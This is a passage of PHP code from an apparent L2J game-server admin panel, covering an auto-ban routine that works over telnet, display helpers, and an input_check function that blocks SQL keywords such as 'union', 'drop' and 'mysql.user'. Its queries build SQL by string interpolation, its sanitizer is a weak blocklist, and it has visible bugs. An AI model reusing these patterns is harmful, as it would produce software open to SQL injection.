		die('Evaluser could not change to gamedb: ' . mysql_error());
	}

	// Find any characters which have a mpxhp or maxmp greater than 50,000 and delete them and their property.
	$result = mysql_query("select account_name, char_name from characters where (maxhp > 50000) or (maxmp > 50000)",$con);
	while ($r_array = mysql_fetch_assoc($result))
	{	$char = $r_array['char_name'];
		$usetelnet = fsockopen($telnet_host, $telnet_port, $errno, $errstr, $telnet_timeout);
		if($usetelnet)
		{
			$give_string = 'announce ' . $char . ' being kicked and deleted for botting.';
			fputs($usetelnet, $telnet_password);
			fputs($usetelnet, "\r\n");
			fputs($usetelnet, $give_string);
			fputs($usetelnet, "\r\n");
			fclose($usetelnet);
			sleep(5);
			$usetelnet = fsockopen($telnet_host, $telnet_port, $errno, $errstr, $telnet_timeout);
			fputs($usetelnet, $telnet_password);
			$give_string = 'kick ' . $char ;
			fputs($usetelnet, $give_string);
			fputs($usetelnet, "\r\n");
			fputs($usetelnet, "exit\r\n");
			fclose($usetelnet);
		}
		delete_char($char, $db_location, $db_user, $db_psswd, $db_l2jdb, $dblog_location, $dblog_user, $dblog_psswd, $dblog_l2jdb);
	}
	
	// Find any characters which have greater than normal access.
	$result = mysql_query("select distinct account_name from characters where accesslevel > 1",$con);
	while ($r_array = mysql_fetch_assoc($result))
	{	
		$accname = $r_array['account_name'];
		// Pull back the GM access status for that characters account.
		$sql = "select access_level from $dblog_l2jdb.knightdrop where name = '$accname'";
		$result2 = mysql_query($sql,$con2);
		$acclevel = mysql_result($result2,0,"access_level");
		// If the account owning the GM character isn't GM level itself, then ban the account and characters.
		if ($acclevel < $sec_inc_gmlevel)
		{
			// Any online characters have to be kicked before they can be banned.
			$result2 = mysql_query("select char_name from characters where account_name = '$accname' and online = 1",$con);
			if ($result2)
			{
				while ($r_array = mysql_fetch_assoc($result2))
				{
					$usetelnet = fsockopen($telnet_host, $telnet_port, $errno, $errstr, $telnet_timeout);
					if($usetelnet)
					{
						$charname = $r_array['char_name'];
						$give_string = 'announce ' . $charname . ' being kicked and banned for access violation.';
						fputs($usetelnet, $telnet_password);
						fputs($usetelnet, "\r\n");
						fputs($usetelnet, $give_string);
						fputs($usetelnet, "\r\n");
						fclose($usetelnet);
						sleep(5);
						$usetelnet = fsockopen($telnet_host, $telnet_port, $errno, $errstr, $telnet_timeout);
						fputs($usetelnet, $telnet_password);
						$give_string = 'kick ' . $charname ;
						fputs($usetelnet, $give_string);
						fputs($usetelnet, "\r\n");
						fputs($usetelnet, "exit\r\n");
						fclose($usetelnet);
					}
				}
			}
			// Ban the account
			$result2 = mysql_query("update $dblog_l2jdb.accounts set accessLevel = -1 where login = '$accname'",$con2);
			$result2 = mysql_query("update characters set accesslevel = -1 where account_name = '$accname'",$con);
			
			// Record the banning event in the notes database.
			$newtime = preg_replace('/\'/','`',$newtime);
			$count = 0;
			$name_user = "Auto Ban System - " . date('dS F Y \- h:iA T');
			// Find the highest numbered note in the table against this account.
			$result = mysql_query("select notenum from $knight_db.accnotes where charname = '$accountname' order by notenum DESC limit 1",$con);
			$query_count = mysql_num_rows($result);
			if ($query_count)									// If a previous note exists, then extract its number.
			{	$count = mysql_result($result,0,"notenum");	}
			$count++;		// Increase the index of the note, and record it.
			$result = mysql_query("insert into $knight_db.accnotes (`charname`, `notenum`, `notemaker`, `note`) values('$accname', '$count', 'AutoBan', 'Account banned - GM character owned by non GM account')",$con);
		}
	}
	
	// Recall all accounts that have above standard access level.
	$result = mysql_query("select login, accessLevel from $dblog_l2jdb.accounts where accessLevel > 1",$con2);
	while ($r_array = mysql_fetch_assoc($result))
	{	
		$accname = $r_array['login'];
		$accesslevel = $r_array['accessLevel'];
		// Recall the checked access level for the account.  Assume 0 if it doesn't exist in the knightdrop table.
		$result2 = mysql_query("select access_level from $dblog_l2jdb.knightdrop where name = '$accname'",$con2);
		if (mysql_num_rows($result2) > 0)
		{	$acclevel = mysql_result($result2,0,"access_level");	}
		else
		{	$acclevel = 0;	}
		// If the account has GM access level, but the level doesn't agree with the knightdrop level, ban the account and characters.
		if (($acclevel >= $sec_inc_gmlevel) && ($acclevel <> $accesslevel))
		{
			// All online characters have to be kicked before being banned.
			$result2 = mysql_query("select char_name from characters where account_name = '$accname' and online = 1",$con);
			while ($r_array = mysql_fetch_assoc($result2))
			{
				$usetelnet = fsockopen($telnet_host, $telnet_port, $errno, $errstr, $telnet_timeout);
				if($usetelnet)
				{
					$charname = $r_array['char_name'];
					$give_string = 'announce ' . $charname . ' being kicked and banned for access violation.';
					fputs($usetelnet, $telnet_password);
					fputs($usetelnet, "\r\n");
					fputs($usetelnet, $give_string);
					fputs($usetelnet, "\r\n");
					fclose($usetelnet);
					sleep(5);
					$usetelnet = fsockopen($telnet_host, $telnet_port, $errno, $errstr, $telnet_timeout);
					fputs($usetelnet, $telnet_password);
					$give_string = 'kick ' . $charname ;
					fputs($usetelnet, $give_string);
					fputs($usetelnet, "\r\n");
					fputs($usetelnet, "exit\r\n");
					fclose($usetelnet);
				}
			}
			// Ban the account
			$result2 = mysql_query("update $dblog_l2jdb.accounts set accessLevel = -1 where login = '$accname'",$con2);
			$result2 = mysql_query("update characters set accesslevel = -1 where account_name = '$accname'",$con);
			
			// Record the banning event in the notes database.
			$newtime = preg_replace('/\'/','`',$newtime);
			$count = 0;
			$name_user = "Auto Ban System - " . date('dS F Y \- h:iA T');
			// Find the highest numbered note in the table against this account.
			$result2 = mysql_query("select notenum from $knight_db.accnotes where charname = '$accountname' order by notenum DESC limit 1",$con);
			$query_count = mysql_num_rows($result2);
			if ($query_count)									// If a previous note exists, then extract its number.
			{	$count = mysql_result($result2,0,"notenum");	}
			$count++;		// Increase the index of the note, and record it.
			$result = mysql_query("insert into $knight_db.accnotes (`charname`, `notenum`, `notemaker`, `note`) values('$accname', '$count', 'AutoBan', 'Account banned - acount value verification failed')",$con);
		}
	}
}


// Checks an item ID against the database and pulls up an alternative if it exists.
function item_check($skill, $i_id, $use_duplicate, $db_location, $db_user, $db_psswd, $db_l2jdb)
{
	if ($use_duplicate)
	{	
		// Connect to DB
		$con = mysql_connect($db_location,$db_user,$db_psswd);
		if (!$con)
		{
			echo "Could Not Connect";
			die('Could not connect: ' . mysql_error());
		}		
		if (!mysql_select_db("$db_l2jdb",$con))
		{	die('Could not change to $db_l2jdb database: ' . mysql_error());	}
		if ($skill)
		{	$sql = "select orig from knightduplicate where item = 1 and dupnum = '$i_id'";	}
		else
		{	$sql = "select orig from knightduplicate where item = 0 and dupnum = '$i_id'";	}
		$result = mysql_query($sql,$con);
		if ($result)
		{
			$count = mysql_num_rows($result);
			if ($count)
			{	$i_id = mysql_result($result,0,"orig");	}
		}
	}
	return $i_id;
}

function checkport($ip, $port, $timeout) 
{
		$sock = @fsockopen($ip, $port, $errno, $errstr, (float)$timeout);
		$online = ($sock>0);
 		if ($sock) @fclose($sock);
 		return $online;
}

function onlinetime($onlinetime)
{
	$onlinetime = intval($onlinetime / 60);
	$minutes = $onlinetime - (intval($onlinetime / 60) * 60);
	$onlinetime = intval($onlinetime / 60);
	$hours = $onlinetime - (intval($onlinetime / 24) * 24);
	$onlinetime = intval($onlinetime / 24);
	$days = $onlinetime - (intval($onlinetime / 30) * 30);
	$onlinetime = intval($onlinetime / 30);
	$onlinetext = "";
	if ($onlinetime > 0)
	{ $onlinetext = $onlinetime . "M,";	}
	if ($days > 0)
	{ $onlinetext = $onlinetext . $days . "d,";	}
	if ($hours > 0)
	{ $onlinetext = $onlinetext . $hours . "h,";	}
	if ($minutes > 0)
	{ $onlinetext = $onlinetext . $minutes . "m";	}
	return $onlinetext;
}

function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

function class_rename($name)
{
	$name = preg_replace('/DE_/','DarkElf ',$name);
	$name = preg_replace('/O_/','Orc ',$name);
	$name = preg_replace('/H_/','Human ',$name);
	$name = preg_replace('/E_/','Elf ',$name);
	$name = preg_replace('/D_/','Dwarf ',$name);
	return $name;
}

// Replacement stripos for older PHP versions thanks to rchillet on the PHP forums.
if (!function_exists("stripos")) 
{
  function stripos($str,$needle,$offset=0)
  {
     return strpos(strtolower($str),strtolower($needle),$offset);
  }
}


// Return a location string for a given shop mob
function shop_loc($shop_loc, $db_location, $db_user, $db_psswd, $db_l2jdb, $lang_unknown)
{
	$con = mysql_connect($db_location,$db_user,$db_psswd);
	if (!$con)
	{
		echo "Could Not Connect";
		die('Could not connect: ' . mysql_error());
	}		
	if (!mysql_select_db("$db_l2jdb",$con))
	{
		die('Could not change to L2J database: ' . mysql_error());
	}
	$sql = "select locx, locy from spawnlist where npc_templateid = '$shop_loc'";
	$result6 = mysql_query($sql,$con);
	$count_locs = 0;
	$shop_location = $lang_unknown;
	while ($r_array = mysql_fetch_assoc($result6)) 
	{
		$lx = $r_array[locx];
		$ly = $r_array[locy];
		$closest = 100000000;
		$location_name = $lang_unknown;
		$i_area_name = $lang_unknown;
		$result7 = mysql_query("select name, x1, y1, x2, y2 from zone where type = 'Town'",$con);
		while ($r_array = @mysql_fetch_assoc($result7)) 
		{
			$x1 = $r_array['x1'];
			$x2 = $r_array['x2'];
			$y1 = $r_array['y1'];
			$y2 = $r_array['y2'];
			$ar_name = $r_array['name'];
			if ($x1 > $x2)
			{
				$temp = $x1;
				$x1 = $x2;
				$x2 = $temp;
			}
			if ($y1 > $y2)
			{
				$temp = $y1;
				$y1 = $y2;
				$y2 = $temp;
			}
			if (($lx >= $x1) && ($lx <= $x2) && ($ly >= $y1) && ($ly <= $y2))
			{
				if ($count_locs == 0)
				{	$i_area_name = "";	}
				if ($count_locs)
				{	$i_area_name = $i_area_name . ', ';	}
				$i_area_name = $i_area_name . $ar_name;
				$count_locs = 1;
			}
		}
		if ($i_area_name == $lang_unknown)
		{
			$closest = 100000000;
			$result8 = mysql_query("select loc_x,loc_y,description from teleport",$con);
			while ($r_array = @mysql_fetch_assoc($result8)) 
			{	
				$x_pos1 = $r_array['loc_x'];	
				$y_pos1 = $r_array['loc_y'];	
				$name1 = $r_array['description'];
				$spos = strpos($name1, '-> ') + 3;
				if ($spos > 3)
				{	$name1 = substr($name1, $spos, (strlen($name1)-$spos));		}
				$distx1 = $lx - $x_pos1;
				if ($distx1 < 0) 
				{	$distx1 = -$distx1;	}
				$disty1 = $ly - $y_pos1;
				if ($disty1 < 0) 
				{	$disty1 = -$disty1;	}
				$pythag = sqrt(($distx1 * $distx1) + ($disty1 * $disty1));
				if ($pythag < $closest)
				{
					$closest = $pythag;
					$location_name = $name1;
				}
			}
												
			if ($location_name == "out)")
			{	$location_name = "Oren Castle";	}
			if (strpos($location_name, "vory Tower") > 0)
			{	$location_name = "Ivory Tower";	}
			if (strlen($location_name) > 0)
			{ $shop_location = $location_name;	}
		}
	}
	return $shop_location;
}

// Return a better looking description for a body part string.
function part_name($i_body_part)
{

	if ($i_body_part == "back")	{ $i_body_part="Cloak";	}
	if ($i_body_part == "chest")	{ $i_body_part="Upper Body";	}
	if ($i_body_part == "alldress")	{ $i_body_part="Dress";	}
	if ($i_body_part == "feet")	{ $i_body_part="Boots";	}
	if ($i_body_part == "gloves")	{ $i_body_part="Gauntlets";	}
	if ($i_body_part == "onepiece")	{ $i_body_part="Full Body";	}
	if ($i_body_part == "deco1")	{ $i_body_part="Talisman";	}
	if ($i_body_part == "head")	{ $i_body_part="Helmet";	}
	if ($i_body_part == "lbracelet")	{ $i_body_part="Left Bracelet";	}
	if ($i_body_part == "rbracelet")	{ $i_body_part="Right Bracelet";	}
	if ($i_body_part == "legs")	{ $i_body_part="Lower Body";	}
	if ($i_body_part == "lhand")	{ $i_body_part="Shield";	}
	if ($i_body_part == "neck")	{ $i_body_part="Necklace";	}
	if ($i_body_part == "bigsword")	{ $i_body_part="Big Sword";	}
	if ($i_body_part == "rapier")	{ $i_body_part="Rapier";	}
	if ($i_body_part == "bigblunt")	{ $i_body_part="Big Blunt";	}
	if ($i_body_part == "ancientsword")	{ $i_body_part="Ancient Sword";	}
	if ($i_body_part == "dual")	{ $i_body_part="Dual";	}
	if ($i_body_part == "dualdagger")	{ $i_body_part="Dual Dagger";	}
	if ($i_body_part == "underwear")	{ $i_body_part="Underwear";	}
	if ($i_body_part == "waist")	{ $i_body_part="Waist";	}
	if ($i_body_part == "hair")	{ $i_body_part="Hair - 1 slot";	}
	if ($i_body_part == "hair2")	{ $i_body_part="Hair - 2nd Slot";	}
	if ($i_body_part == "hairall")	{ $i_body_part="Hair - 2 slot";	}
	if ($i_body_part == "rfinger;lfinger")	{ $i_body_part="Rings";	}
	if ($i_body_part == "rear;lear")	{ $i_body_part="Earings";	}
	if ($i_body_part == "paper")	{ $i_body_part="Paper";	}
	if ($i_body_part == "wood")	{ $i_body_part="Wood";	}
	if ($i_body_part == "fish")	{ $i_body_part="Fish";	}
	if ($i_body_part == "gold")	{ $i_body_part="Gold";	}
	if ($i_body_part == "liquid")	{ $i_body_part="Liquid";	}
	if ($i_body_part == "bone")	{ $i_body_part="Bone";	}
	if ($i_body_part == "bronze")	{ $i_body_part="Bronze";	}
	if ($i_body_part == "cloth")	{ $i_body_part="Cloth";	}
	if ($i_body_part == "crystal")	{ $i_body_part="Crystal";	}
	if ($i_body_part == "leather")	{ $i_body_part="Leather";	}
	if ($i_body_part == "fine_steel")	{ $i_body_part="Fine Steel";	}
	if ($i_body_part == "adamantaite")	{ $i_body_part="Adamantaite";	}
	if ($i_body_part == "mithril")	{ $i_body_part="Mithril";	}
	if ($i_body_part == "silver")	{ $i_body_part="Silver";	}
	if ($i_body_part == "steel")	{ $i_body_part="Steel";	}
	if ($i_body_part == "chrysolite")	{ $i_body_part="Chrysolite";	}
	if ($i_body_part == "damascus")	{ $i_body_part="Damascus";	}
	if ($i_body_part == "blood_steel")	{ $i_body_part="Blood Steel";	}
	if ($i_body_part == "oriharukon")	{ $i_body_part="Oriharukon";	}
	if ($i_body_part == "rune_remove")	{ $i_body_part="Rune - Remove";	}
	if ($i_body_part == "rune_xp")	{ $i_body_part="Rune - XP";	}
	if ($i_body_part == "rune_sp")	{ $i_body_part="Rune - SP";	}
	if ($i_body_part == "scale_of_dr")	{ $i_body_part="Scale Of Dr";	}
	if ($i_body_part == "bow")	{ $i_body_part="Bow";	}
	if ($i_body_part == "dualfist")	{ $i_body_part="Dual Fist";	}
	if ($i_body_part == "sword")	{ $i_body_part="Sword";	}
	if ($i_body_part == "dagger")	{ $i_body_part="Dagger";	}
	if ($i_body_part == "crossbow")	{ $i_body_part="Crossbow";	}
	if ($i_body_part == "fishingrod")	{ $i_body_part="Fishing Rod";	}
	if ($i_body_part == "blunt")	{ $i_body_part="Blunt";	}
	if ($i_body_part == "flag")	{ $i_body_part="Flag";	}
	if ($i_body_part == "pole")	{ $i_body_part="Pole";	}
	if ($i_body_part == "fist")	{ $i_body_part="Fist";	}
	if ($i_body_part == "etc")	{ $i_body_part="Etc";	}
	if ($i_body_part == "ownthing")	{ $i_body_part="Own Thing";	}
	if ($i_body_part == "bigsword")	{ $i_body_part="Big Sword";	}
	if ($i_body_part == "rapier")	{ $i_body_part="Rapier";	}
	if ($i_body_part == "bigblunt")	{ $i_body_part="Big Blunt";	}
	if ($i_body_part == "ancientsword")	{ $i_body_part="Ancient Sword";	}
	if ($i_body_part == "dual")	{ $i_body_part="Dual";	}
	if ($i_body_part == "dualdagger")	{ $i_body_part="Dual Dagger";	}
	return $i_body_part;
}

// Return a strong for an element type
function element_name($element_type)
{
	$element_name = "Unknown";
	if ($element_type == 0)	{ $element_name="Fire";	}
	if ($element_type == 1)	{ $element_name="Water";	}
	if ($element_type == 2)	{ $element_name="Wind";	}
	if ($element_type == 3)	{ $element_name="Earth";	}
	if ($element_type == 4)	{ $element_name="Holy";	}
	if ($element_type == 5)	{ $element_name="Dark";	}

	return $element_name;
}


// Delete a character, and all associated items, from the database.
function item_name($itemid, $db_location, $db_user, $db_psswd, $db_l2jdb)
{
	$con = mysql_connect($db_location,$db_user,$db_psswd);
	if (!$con)
	{
		echo "Could Not Connect";
		die('Could not connect: ' . mysql_error());
	}		
	if (!mysql_select_db("$db_l2jdb",$con))
	{
		die('Could not change to L2J database: ' . mysql_error());
	}
	$name = "<unknown>";
	$sql = "select name, crystal_type from knightarmour where item_id = $itemid";
	$result = mysql_query($sql,$con);
	while ($r_array = mysql_fetch_assoc($result))
	{	$name = $r_array['name'] . $r_array['crystal_type'];	}
	$sql = "select name, crystal_type from knightweapon where item_id = $itemid";
	$result = mysql_query($sql,$con);
	while ($r_array = mysql_fetch_assoc($result))
	{	$name = $r_array['name'] . $r_array['crystal_type'];	}
	$sql = "select name, consume_type from knightetcitem where item_id = $itemid";
	$result = mysql_query($sql,$con);
	while ($r_array = mysql_fetch_assoc($result))
	{	$name = $r_array['name'] . $r_array['crystal_type'];	}
	return $name;
}


// Goes through an input string and returns a string parsed for characters potentially used for hacking.
function input_check($str, $level) 
{
	if ($level == 1)
	{	$str = preg_replace('/[&%$\/\\\|@<#£]/','',$str);	}
	else
	{	$str = preg_replace('/[&%$\/\\\|<>#£]/','',$str);	}
	if ($level == 2)
	$str = preg_replace('/[^0-9]/','',$str);
	$str = preg_replace('/\'/','\\\'',$str);
  $str = preg_replace('/mysql./i','',$str);
//  $str = preg_replace('/\'/','\\\'',$str);
  $count_match = 0;
  if (stripos($str, 'union ') > 0)
  {	$count_match++;	}
  if (stripos($str, 'select ') > 0)
  {	$count_match++;	}
  if (stripos($str, ' where ') > 0)
  {	$count_match++;	}
  if (stripos($str, 'update ') > 0)
  {	$count_match++;	}
  if (stripos($str, 'delete ') > 0)
  {	$count_match++;	}
  if (stripos($str, 'insert ') > 0)
  {	$count_match++;	}
  if (stripos($str, 'drop ') > 0)
  {	$count_match++;	}
  if (stripos($str, 'mysql.user') > 0)
  {	$count_match = $count_match+2;	}
  if (stripos($str, 'knightdrop') > 0)
  {	$count_match = $count_match+2;	}
  if ($count_match > 1)
  {	$str = "";	}
  if (($level == 2) && (strlen($str) < 1))
  {	$str = "0";	}
  return $str;
}

function lang2utf8($str) //testing new multifunction for coding into utf-8 (i discovered - its automatic by locale from config)
{
return utf8_encode($str);
}

function utf82lang ($s)
{
return utf8_encode($s);
}
?>
